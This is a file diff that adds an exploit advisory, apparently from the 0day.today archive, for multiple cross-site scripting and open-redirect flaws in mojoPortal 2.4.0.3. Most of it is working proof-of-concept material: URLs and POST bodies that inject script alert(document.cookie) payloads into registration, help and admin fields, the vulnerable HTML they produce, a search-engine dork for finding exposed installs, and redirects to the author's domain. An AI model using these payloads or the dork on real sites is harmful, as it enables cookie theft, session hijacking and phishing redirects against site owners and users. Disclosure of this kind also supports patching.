@@ -1,0 +1,172 @@
+id: 22166
+date: 04/21/2014
+title: mojoPortal 2.4.0.3 Multiple XSS Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: mojoPortal 2.4.0.3 Multiple XSS Vulnerabilities
+#Version: >= 2.4.0.3 / 2014-04-14 (Latest ATM)
+#Date: 20.04.14
+#Vendor: mojoportal.com
+#Demo: demo.mojoportal.com
+#Tested on: IIS 7.0, ASP.NET 4.0.30319
+#Dork: intext:"Powered by mojoPortal"
+#Contact: smash[at]devilteam.pl
+
+1. Cross Site Scripting
+
+#All
+
+ - GET returnurl
+
+ host/secure/register.aspx?returnurl=[XSS]
+
+ Vuln:
+ 	<li class="topnavitem"><a class="sitelink" rel="nofollow" href="host/Secure/Register.aspx?returnurl=" onmouseover=alert(document.cookie) xss="true">Register</a></li>
+
+ PoC:
+ https://demo.mojoportal.com/secure/register.aspx?returnurl=" onmouseover=alert(document.cookie) xss="true
+
+ - GET helpkey
+
+ host/Help.aspx?helpkey=[XSS]
+
+Vuln:
+    <a href='https://demo.mojoportal.com/HelpEdit.aspx?helpkey='><script>alert(document.cookie)</script>'>Edit</a><br />
+
+PoC:
+ https://demo.mojoportal.com/Help.aspx?helpkey='><script>alert(document.cookie)</script
+
+#Admin panel
+
+ Administration Menu > Content Manager 
+
+ - GET sort
+
+ host/Admin/ContentCatalog.aspx?sort=[XSS]
+
+ Also XSS appears in Content Manager > Create New Content, just insert your JS/HTML code into content title.
+
+Vuln:
+  <a class='inactive'  href="https://demo.mojoportal.com/Admin/ContentCatalog.aspx?md=-1&amp;title=&amp;sort="><script>alert(document.cookie)</script>&amp;pagenumber=2"  title="Navigate to Page 2" >2</a> 
+
+PoC:
+ https://demo.mojoportal.com/Admin/ContentCatalog.aspx?sort="><script>alert(document.cookie)</script>
+.
+
+Site Settings > Search Name
+
+ - POST ctl00$mainContent$txtOpenSearchName
+
+POST /Admin/SiteSettings.aspx HTTP/1.1
+ ctl00%24mainContent%24txtOpenSearchName="><script>alert(document.cookie)</script>
+
+ Vuln:
+ <link rel="search" type="application/opensearchdescription+xml" title=""><script>alert(document.cookie)</script>" href="https://demo.mojoportal.com/SearchEngineInfo.ashx" />
+
+ .
+
+ - POST ctl00$mainContent$txtModuleTitle
+
+POST /Admin/ContentCatalog.aspx?sort=666 HTTP/1.1
+
+(...)ctl00%24mainContent%24txtModuleTitle='>"><>66625516<script>alert(1)<%2fscript>0b354(...)
+
+Vuln:
+ <span id="ctl00_mainContent_lblModuleTitle">'>"><>66625516<script>alert(1)</script>0b354</span>
+ 
+ .
+
+ Site Settings > Site Title
+
+ - POST ctl00$mainContent$txtSiteName
+
+POST /Admin/SiteSettings.aspx HTTP/1.1
+ ctl00%24mainContent%24txtSiteName=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+Vuln:
+ <head id="ctl00_Head1"><title>
+	Site Settings - </title><script>alert(document.cookie)</script>
+ </title> .
+
+ <link rel="search" type="application/opensearchdescription+xml" title=""><script>alert(document.cookie)</script>
+
+ <h1 class="art-headline"><a class='siteheading' href='https://demo.mojoportal.com'>"><script>alert(document.cookie)</script></a>
+
+ <span class='art-postheadericon' onmouseover=alert(document.cookie) xss='true'> Site Settings</span></h2></div>
+
+.
+
+Site Settigns > Company Info
+
+- POST ctl00$mainContent$txtMinRequiredNonAlphaNumericCharacters
+
+POST /Admin/SiteSettings.aspx HTTP/1.1
+ ctl00%24mainContent%24txtMinRequiredNonAlphaNumericCharacters='>"><>XSS
+
+Vuln:
+ <link rel="search" type="application/opensearchdescription+xml" title="'>"><>XSS"
+
+.
+
+ Administration Menu > Role Administration > Add New Role
+
+ - POST ctl00$mainContent$txtNewRoleName='>"><>666
+
+POST 
+ ctl00%24mainContent%24txtNewRoleName=%27%3E%22%3E%3C%3E666
+
+Vuln:
+ <span id="ctl00_mainContent_rolesList_ctl00_Label1">'>"><>666</span>
+
+.
+
+ - POST ctl00$mainContent$txtPageDescription
+ - POST ctl00$mainContent$txtPageKeywords
+ - POST ctl00$mainContent$txtPageTitle
+
+POST /Admin/PageSettings.aspx?pageid=7581 HTTP/1.1
+
+(...)&ctl00%24mainContent%24txtPageKeywords=ff5c6"><script>alert(1)<%2fscript>11605(...)
+
+Vuln:
+ <meta name="keywords" content="ff5c6"><script>alert(1)</script>11605" />
+
+
+2. Open Redirection
+
+ - POST ctl00$mainContent$txtUrl
+
+Request:
+ POST /Admin/PageSettings.aspx?pageid=7581 HTTP/1.1
+ ctl00%24mainContent%24ddPages=-1&ctl00%24mainContent%24hdnParentPageId=&ctl00%24mainContent%24txtPageName=Events&ctl00%24mainContent%24hdnPageName=Events&ctl00%24mainContent%24txtPageTitle=&ctl00%24mainContent%24txtUrl=http://devilteam.pl/&(...rest of POST's).
+
+Response:
+ HTTP/1.1 302 Found
+ Location: http://devilteam.pl/
+ Server: Microsoft-IIS/7.0
+ Strict-Transport-Security: max-age=300
+ X-AspNet-Version: 4.0.30319
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="http://devilteam.pl/">here</a>.</h2>
+</body></html>
+
+ - GET returnurl
+
+ host/Secure/Login.aspx?returnurl=//url.com
+
+Response:
+HTTP/1.1 302 Found
+Cache-Control: no-cache, no-store, must-revalidate, post-check=0,pre-check=0
+Location: //devilteam.pl
+Server: Microsoft-IIS/7.0
+
+<html><head><title>Object moved</title></head><body>
+<h2>Object moved to <a href="//devilteam.pl">here</a>.</h2>
+</body></html>
+
+PoC:
+ https://demo.mojoportal.com/Secure/Login.aspx?returnurl=%2f%2fdevilteam.pl
+
+#  0day.today [2023-03-25]  #
